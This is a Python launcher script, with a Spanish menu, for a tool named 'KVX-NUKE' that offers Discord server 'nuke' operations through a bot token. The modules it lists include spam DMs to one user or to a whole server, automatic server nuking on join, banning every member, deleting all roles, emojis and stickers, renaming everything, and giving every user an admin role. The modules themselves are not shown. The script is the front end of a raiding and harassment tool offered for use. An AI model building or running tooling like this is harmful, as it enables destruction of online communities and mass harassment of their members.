#!/usr/bin/env python3
"""KVX-NUKE · Panel de herramientas Discord para Termux."""

import sys

from core import ui
from core.settings import CONFIG
from tools import (
    auto_nuke,
    ban_all,
    delete_emojis_stickers,
    dm_all,
    dm_spam,
    nuke_command,
    rename_all,
    role_give_all,
    roles_manager,
)

TOOLS = [
    ("01", "DM-SPAM a un usuario", dm_spam),
    ("02", "Auto-Nuke de servidor (al entrar)", auto_nuke),
    ("03", "Nuke por comando !nuke", nuke_command),
    ("04", "Eliminar emojis y stickers", delete_emojis_stickers),
    ("05", "Banear a todos los miembros", ban_all),
    ("06", "DM-SPAM masivo a todo el servidor", dm_all),
    ("07", "Renombrar todo + nombre e imagen del servidor", rename_all),
    ("08", "Crear roles / borrar todos los roles", roles_manager),
    ("09", "Dar un rol a todos los usuarios (admin / sin admin)", role_give_all),
]


def pedir_token():
    ui.clear()
    ui.banner("CONEXION")
    ui.title("TOKEN DEL BOT DE DISCORD")
    ui.info("Pega el token de tu aplicación del Discord Developer Portal.")
    print()
    token = ui.ask("Token del bot").replace('"', "").replace("'", "")
    CONFIG.token = token
    ui.ok("Token guardado para esta sesión.")


def mostrar_menu():
    ui.clear()
    ui.banner("PANEL DE HERRAMIENTAS")
    print()
    for numero, nombre, _ in TOOLS:
        print(f"   {ui.GREEN}{ui.BOLD}[{numero}]{ui.RESET}  {ui.WHITE}{nombre}{ui.RESET}")
    print()
    print(f"   {ui.MAGENTA}{ui.BOLD}[10]{ui.RESET}  {ui.WHITE}Cambiar token{ui.RESET}")
    print(f"   {ui.RED}{ui.BOLD}[00]{ui.RESET}  {ui.WHITE}Salir{ui.RESET}")
    print()
    ui.sep()
    t = CONFIG.token
    resumen = f"{t[:10]}...{t[-6:]}" if len(t) > 20 else t
    print(f"{ui.CYAN}Token activo: {resumen}{ui.RESET}")


def main():
    ui.enable_ansi()
    pedir_token()

    while True:
        mostrar_menu()
        opcion = input(f"\n{ui.GREEN}{ui.BOLD}  -> Elige una opción: {ui.RESET}").strip()

        if opcion in ("0", "00", "salir"):
            ui.clear()
            ui.banner("HASTA LUEGO")
            print(f"\n{ui.GREEN}{ui.BOLD}  Cerrando panel...{ui.RESET}\n")
            break

        if opcion in ("10", "010"):
            pedir_token()
            continue

        elegido = None
        for numero, nombre, modulo in TOOLS:
            if opcion == numero or opcion == str(int(numero)):
                elegido = (numero, nombre, modulo)
                break

        if elegido is None:
            ui.warn("Opción inválida.")
            ui.pause("ENTER para continuar...")
            continue

        _, _, modulo = elegido
        try:
            modulo.run(CONFIG)
        except KeyboardInterrupt:
            ui.warn("Interrumpido.")
            ui.pause()
        except Exception as e:
            ui.err(f"Error inesperado: {e}")
            ui.pause()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        ui.clear()
        print(f"{ui.RED}{ui.BOLD}Saliendo...{ui.RESET}")
        sys.exit(0)
